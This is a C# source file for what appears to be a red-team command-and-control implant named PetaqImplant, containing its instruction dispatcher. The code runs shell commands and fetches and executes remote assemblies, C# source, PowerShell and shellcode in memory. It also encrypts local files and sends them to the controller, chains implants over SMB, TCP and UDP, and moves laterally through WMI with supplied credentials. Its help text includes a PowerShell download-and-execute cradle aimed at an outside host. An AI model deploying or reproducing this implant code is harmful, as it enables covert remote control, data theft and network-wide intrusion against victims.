using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Security.Cryptography;

namespace PetaqImplant
{
    public class Instructions
    {        

        public static void Help()
        {
            Console.WriteLine(@"The following sample instructions are available:
Examples:
    exec cmd /c dir
    exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
    exec-sharpassembly url http://127.0.0.1/test.exe
    exec-sharpcode base64 http://127.0.0.1/test.b64
    exec-sharpcode url http://127.0.0.1/test.cs
    exec-sharpcode base64 http://127.0.0.1/test.cs.b64
    exec-sharpdirect Console.WriteLine(""test 1234"");
    link tcp://127.0.0.1/8002
    link udp://127.0.0.1/8002
    link smb://127.0.0.1
    link smb://127.0.0.1/petaq_comm
    upload 1.txt c:\windows\temp\1.txt
    download c:\windows\temp\1.txt
    lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command=""powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))""


Link operations:
    route
    sessions
    link URI
    unlink ID

Scenarios Run:
    scenarios
    scenarios report SCENARIOID
    scenarios report SCENARIOID output

Scenario to run:
    scenario IMPLANTID scenariofile

File operations:
    upload LOCALFILEPATH REMOTEFILEPATH
    download REMOTEFILEPATH

Lateral movement:
    lateralmovement wmiexec domain=DOMAIN username=USER password=PASSWORD host=REMOTEHOST command=""COMMANDTORUN""

Execute a command/binary:
    exec cmd.exe /c dir
    exec powershell -c Write-Output($env:UserName)

Execute a command/binary/assembly as a thread (no wait, no output):
    execthread cmd.exe /c dir
    execthread powershell -c Write-Output($env:UserName)
    execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
    execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
    execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
    execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters

Inline run for .NET source code:
    exec-sharpdirect SHARPCODE
    exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
    exec-sharpdirect file FILEPATH Parameters

Execute a .NET assembly:
    exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
    exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
    exec-sharpassembly file FILEPATH Parameters

Compile & Execute .NET source code:
    exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
    exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
    exec-sharpcode file FILEPATH Parameters

Powershell Through .NET System Automation:
    exec-powershellautomation SHARPCODE
    exec-powershellautomation base64 BASE64_ENCODED_SHARPCODE
    exec-powershellautomation file FILEPATH Parameters

Execute Shellcode:
    exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
    exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
    exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
    exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
    exec-shellcode file FILEPATH ARCH64 T1
    exec-shellcode file FILEPATH ARCH32 T2

Exit:
    exit
    terminate");
        }
        public static void Instruct(string instructions, TextWriter instruction_IO)
        {

            // spliting the instructions to string[]
            string[] args = Regex.Split(instructions, " ");

            // Set the socket as the Console output
            Program.consoleIO = Console.Out;
            Console.SetOut(instruction_IO);

            if (args.Length == 0)
            {
                Console.WriteLine("No instructions?");
                Help();
            }
            else
            {
                try
                {
                    string dataToSend = "";
                    switch (args[0])
                    {
                        case "help":
                            Help();
                            break;
                        case "sleep":
                            if (args.Length > 1)
                            {
                                Thread.Sleep(Int32.Parse(args[1]));
                            }
                            else
                            {
                                Console.WriteLine("Usage: sleep 5");
                            }
                            break;
                        case "register":                            
                            Console.Error.WriteLine("Registering the implant information.");

                            // register the implant information
                            Program.Register();

                            // regist the the linked implants
                            Program.RegisterLinkedImplants();

                            // ask registration from all linked implants
                            Program.AskRegistrationsFromAllLinkedImplants();

                            // ask route updates from all linked implants
                            Program.AskRouteUpdatesFromAllLinkedImplants();

                            //Console.Error.WriteLine("Registration is complete.");

                            break;
                        case "routeupdates":
                            //Console.WriteLine("Route updates is sending...");
                            Console.WriteLine("routeupdates");
                            break;
                        case "download":
                            Console.WriteLine("Download is in progress...");
                            string dfilename = String.Join(" ", args.SubArray(1, (args.Length - 1)));
                            try
                            {
                                // Getting the file content encrypted
                                byte[] filecontent = File.ReadAllBytes(dfilename);
                                string filecontentencoded = Convert.ToBase64String(filecontent);
                                string filecontentencrypted = Common.Encrypt(filecontentencoded);
                                Console.Error.WriteLine("Encrypted:" + filecontentencrypted);
                                // Telling the filename size, filecontentencrypted size and filename to server                       
                                Console.WriteLine("download {0} {1}", filecontentencrypted.Length, dfilename);
                                // The server is waiting for the file content now
                                Program.LinkService.Send(filecontentencrypted);
                                
                                Console.WriteLine("Download successfully finished.");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Download error: {0}", ex.Message);
                            }
                            break;
                        case "upload":
                            Console.WriteLine("Upload is in progress...");
                            string ufilename = args[2];
                            string ucontent = args[1];
                            try
                            {
                                // Writing the content to the local file
                                File.WriteAllBytes(ufilename, Convert.FromBase64String(ucontent));
                                Console.WriteLine("Saving {0} is successful.", ufilename);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("Files folder or file couldn't be created: {0}.", e);
                            }
                            
                            break;
                        case "routeremove":
                            if (args.Length > 1 && Program.implantRoutes.ContainsKey(args[1]))
                            {
                                string rrid = args[1];
                                Console.WriteLine("{0} is removing from the routing table...", rrid);
                                Program.implantRoutes.TryRemove(rrid, out string rridvalue);
                            }
                            else
                            {
                                Console.WriteLine("Session is not linked.");
                            }

                            break;

                        case "lateralmovement":
                            Console.WriteLine("Lateral movement starting...");
                            Dictionary<string, string> options = new Dictionary<string, string>();
                            switch (args[1])
                            {
                                case "wmiexec":
                                    // lateralmovement wmiexec domain=DOM username=USER password=PASS host=127.1 command="powershell -c asssd"
                                    Console.WriteLine("instuctions: {0}",instructions);
                                    string command = Regex.Split(instructions, "\"")[1];
                                    args = Regex.Split(Regex.Split(instructions, "\"")[0], " ");

                                    for (int i = 2; i < args.Length; i++)
                                    {
                                        // get the parameters
                                        string var = Regex.Split(args[i], "=")[0];
                                        string val = Regex.Split(args[i], "=")[1];
                                        // make the parameters a dictonary
                                        if (var != "command")
                                        {
                                            options.Add(var, val);
                                            Console.WriteLine("{0} => {1}", var, val);
                                        }
                                        else
                                        {
                                            Console.WriteLine("Command is adding...");
                                            options.Add("command", command);
                                            Console.WriteLine("command => {0}", command);
                                        }
                                    }
                                    Console.WriteLine("The parameters are processing...");
                                    // call WMI
                                    LateralMovementWMI lm = new LateralMovementWMI();
                                    lm.Connect(options);
                                    break;

                                //wmiquery will be added soon
                                //case "wmiquery":
                                //    for (int i = 2; i < args.Length; i++)
                                //    {
                                //        // get the parameters
                                //        string var = Regex.Split(args[i], "=")[0];
                                //        string val = Regex.Split(args[i], "=")[1];
                                //        // make the parameters a dictonary
                                //        options.Add(var, val);
                                //        Console.WriteLine("{0} => {1}", var, val);
                                //    }
                                //    // call WMI
                                //    LateralMovementWMI lmq = new LateralMovementWMI();
                                //    lmq.Connect(options);
                                //    break;
                                default:
                                    Console.WriteLine("Lateral movement method is not supported");
                                    break;
                            }
                            break;
                        case "link":
                            if (args.Length < 2)
                            {
                                dataToSend += "Remote host and link type are missing. Example usages:\n" +
                                    "* link smb://192.168.1.1\n" +
                                    "* link smb://192.168.1.1/NamedPipeName\n" +
                                    "* link tcp://192.168.1.1/8002\n" +
                                    "* link udp://192.168.1.1/8002\n";
                            }
                            else
                            {                                
                                string[] protos = { "smb", "tcp", "udp" };
                                if ( ! Array.Exists(protos, element => element == Regex.Split(args[1], ":")[0] )) {
                                    dataToSend += "Unsupported link protocol.";
                                }
                                else
                                {
                                    string link_uri = args[1];
                                    // new implant linking
                                    LinkedImplant linked_implant = new LinkedImplant(link_uri);
                                    // linked implant added to the list
                                    Program.LinkedImplants.Add(linked_implant.sessionId, linked_implant);
                                    // no route information necessary for the linked implants
                                    // sending the registration data to the linked service
                                    dataToSend += "Implant linking started for " + link_uri + " as " + linked_implant.sessionId;

                                }
                            }
                            Console.WriteLine(dataToSend);
                            break;
                        case "sessions":
                            if (Program.LinkedImplants.Count == 0) { Console.WriteLine("No implant linked."); break; }
                            dataToSend += "Linked session(s):\n";
                            foreach (KeyValuePair<string, LinkedImplant> linked_implant in Program.LinkedImplants)
                            {
                                dataToSend += linked_implant.Key + "\t" + linked_implant.Value.implantObject.Status + "\n";
                            }

                            Console.WriteLine(dataToSend);
                            break;

                        case "route":
                            if (Program.implantRoutes.Count == 0) { Console.WriteLine("Routing table is empty."); break; }
                            dataToSend += "Routing table:\n";
                            foreach (KeyValuePair<string, string> r in Program.implantRoutes)
                            {
                                dataToSend += r.Key + " is linked through " + r.Value + ".\n";
                            }
                            Console.WriteLine(dataToSend);
                            break;
                        case "transmit":
                            if (args.Length < 2)
                            {
                                Console.WriteLine("Session ID and command are missing. Example usage:\n" +
                                    "* transmit SESSIONID COMMAND\n");
                            }
                            else
                            {
                                string sessionId = args[1];
                                string cmd = String.Join(" ", args.SubArray(2, (args.Length - 2)));
                                string instruction = Common.Encrypt(cmd);
                                Console.WriteLine("The instruction is routing via {0}", sessionId);
                                if (Program.LinkedImplants.ContainsKey(sessionId))
                                {
                                    // session ID is in the linked implants table, so transmitting it
                                    LinkedImplant linked_implant = Program.LinkedImplants[sessionId];
                                    if (linked_implant.implantObject.Status)
                                    {
                                        Console.WriteLine("The instruction is sending to the linked implant.\n{0}", cmd);
                                        linked_implant.implantObject.Send(instruction);
                                    }
                                    else { Console.WriteLine("Session is disconnected."); }
                                }
                                else
                                {
                                    if (Program.implantRoutes.ContainsKey(sessionId))
                                    {
                                        // session ID is in the routing table, so transmitting it via next hop
                                        LinkedImplant linked_implant = Program.LinkedImplants[Program.implantRoutes[sessionId]];
                                        if (linked_implant.implantObject.Status)
                                        {
                                            Console.WriteLine("The instruction is routing via {0}.\n{1}", Program.implantRoutes[sessionId], instructions);
                                            linked_implant.implantObject.Send(Common.Encrypt(instructions));
                                        }
                                        else { Console.WriteLine("Session is disconnected."); }
                                    }
                                    else { Console.WriteLine("Invalid session ID"); }
                                }
                            }

                            break;
                        case "unlink":
                            if (args.Length < 2)
                            {
                                Console.WriteLine("Session ID is missing. Example usage:\n" +
                                    "* unlink SESSIONID\n");
                            }
                            else
                            {
                                string sid = args[1];
                                if (Program.LinkedImplants.ContainsKey(sid)) {
                                    if (Program.LinkedImplants[sid].implantObject.Status)
                                    {
                                        Console.WriteLine("Disconnecting {0}", sid);
                                        Program.LinkedImplants[sid].implantObject.Disconnect();
                                    }
                                    else
                                    {
                                        Console.WriteLine("Session is already disconnected.");
                                    }
                                    Console.WriteLine("{0} is removing from the sessions table...", sid);
                                    Program.LinkedImplants.Remove(sid);
                                    Console.WriteLine("{0} is removing from the routing table...", sid);
                                    Program.implantRoutes.TryRemove(sid, out string sidrvalue);
                                    Console.WriteLine("{0} is removing from the linked service routing table...", sid);
                                    Console.WriteLine("routeremove {0}", sid);
                                    Program.RegisterLinkedImplants();
                                }
                                else
                                {
                                    Console.WriteLine("Invalid session ID");

                                }
                            }
                            break;                       
                        case "exec":
                            if (args.Length > 2)
                            {
                                Capabilities.Exec(args[1], String.Join(" ",args.SubArray(2, (args.Length - 2))));
                            }
                            else if (args.Length == 2)
                            {
                                Capabilities.Exec(args[1], "");
                            }
                            else
                            {
                                Console.WriteLine("Missing executable name & path.");
                                Help();
                            }
                            break;
                        case "execthread":
                            if (args.Length > 2)
                            {
                                Capabilities.Exec(args[1], String.Join(" ", args.SubArray(2, (args.Length - 2))), false);
                            }
                            else if (args.Length == 2)
                            {
                                Capabilities.Exec(args[1], "", false);
                            }
                            else
                            {
                                Console.WriteLine("Missing executable name & path.");
                                Help();
                            }
                            break;
                        case "exec-sharpassembly":
                            ExecSharpAssemblyBridge(args,true);
                            break;
                        case "execthread-sharpassembly":
                            ExecSharpAssemblyBridge(args, false);                            
                            break;
                        case "exec-shellcode":
                            ExecShellcodeBridge(args);
                            break;
                        case "exec-powershellautomation":
                            ExecPowershellAutomation(args);
                            break;
                        case "execthread-powershellautomation":
                            ExecPowershellAutomation(args,false);
                            break;
                        case "exec-sharpcode":
                            ExecSharpCodeBridge(args, true);                    
                            break;
                        case "execthread-sharpcode":
                            ExecSharpCodeBridge(args, false);
                            break;
                        case "exec-sharpdirect":
                            string code = String.Join(" ", args.SubArray(1, (args.Length - 1)));
                            string head = "using System;\npublic class Program\n {public static void Main()\n{";
                            string tail = "\n}\n}";
                            string sharpdirect = head + code + tail;
                            Capabilities.ExecSharpCode(sharpdirect, null);
                            break;
                        case "exit":
                            Program.exit = true;
                            Console.WriteLine("Exiting...");
                            if (Program.LinkService != null)
                            {
                                Program.LinkService.Stop();
                            }
                            break;
                        case "terminate":
                            Program.exit = true;
                            Program.terminate = true;
                            break;
                        default:
                            Console.WriteLine("Unknown instruction: {0}", args[0]);
                            Help();
                            break;
                    }


                }
                
                catch (Exception e)
                {
                    Console.WriteLine("Instruction failed, here is what requested:\n");
                    Console.WriteLine("Error:\n{0}",e);
                }
            }
        }

        public static void ExecSharpAssemblyBridge(string[] args, bool threadwait=false)
        {
            WebClient client = Common.GetWebClient();
            byte[] sharpassembly = { };
            string[] sharpassembly_arg = { };
            if (args.Length > 3)
            {
                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
            }

            switch (args[1])
            {
                case "url":
                    sharpassembly = client.DownloadData(args[2]);
                    break;
                case "base64":
                    string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    sharpassembly = Convert.FromBase64String(base64ofasm);
                    break;
                case "file":
                    sharpassembly = Convert.FromBase64String(args[2]);                   
                    break;
                default:
                    Console.WriteLine("Only url, file or base64 are valid for .NET assembly delivery.");
                    Help();
                    break;
            }
            Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg, threadwait);

        }
        public static void ExecSharpCodeBridge(string[] args, bool threadwait = false)
        {
            WebClient client = Common.GetWebClient();
            string sharpcode = "";
            string[] sharpcode_arg = { };
            if (args.Length > 3)
            {
                sharpcode_arg = args.SubArray(3, (args.Length - 3));
            }

            switch (args[1])
            {
                case "url":
                    sharpcode = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    break;
                case "base64":
                    string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
                    break;
                case "file":
                    sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    break;
                default:
                    Console.WriteLine("Only url or base64 are valid for sharpcode delivery.");
                    Help();
                    break;
            }
            Capabilities.ExecSharpCode(sharpcode, sharpcode_arg, threadwait);

        }
        public static void ExecPowershellAutomation(string[] args, bool threadwait = false)
        {
            WebClient client = Common.GetWebClient();
            string pscontent = "";
            string[] pscontent_arg = { };
            if (args.Length > 3)
            {
                pscontent_arg = args.SubArray(3, (args.Length - 3));
            }

            switch (args[1])
            {
                case "url":
                    pscontent = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    break;
                case "base64":
                    string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    pscontent = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
                    break;
                case "file":
                    pscontent = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    break;
                default:
                    Console.WriteLine("Only url or base64 are valid for powershell content delivery.");
                    Help();
                    break;
            }
            Capabilities.ExecPowershellAutomation(pscontent, pscontent_arg, threadwait);

        }
        public static void ExecShellcodeBridge(string[] args)
        {
            WebClient client = Common.GetWebClient();
            byte[] shellcode = { };
            string shellcode_arch = args[3];
            switch (args[1])
            {
                case "url":
                    shellcode = client.DownloadData(args[2]);
                    break;
                case "base64":
                    string base64ofsc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                    shellcode = Convert.FromBase64String(base64ofsc);
                    break;
                case "file":
                    shellcode = Convert.FromBase64String(args[2]);
                    break;
                default:
                    Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
                    Help();
                    break;
            }
            Capabilities.ExecShellcode(shellcode, shellcode_arch);
        }
    }
}
